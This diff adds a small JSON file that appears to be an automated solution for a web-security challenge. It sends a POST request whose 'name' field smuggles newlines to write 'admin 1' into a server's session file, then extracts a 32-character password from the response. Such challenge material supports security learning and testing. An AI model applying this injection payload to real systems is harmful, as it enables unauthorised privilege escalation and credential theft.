@@ -1,0 +1,11 @@
+{
+    "hint":"change session file data",
+    "findedByRegexInContent":"Password: [a-zA-Z0-9]{32}",
+    "isQuerystring": true,
+    "method":"post",
+    "body": {
+        "name": "majidh1\nadmin 1\n\n"
+    },
+    "maxCount": 2,
+    "resendResponseCookie": true
+}
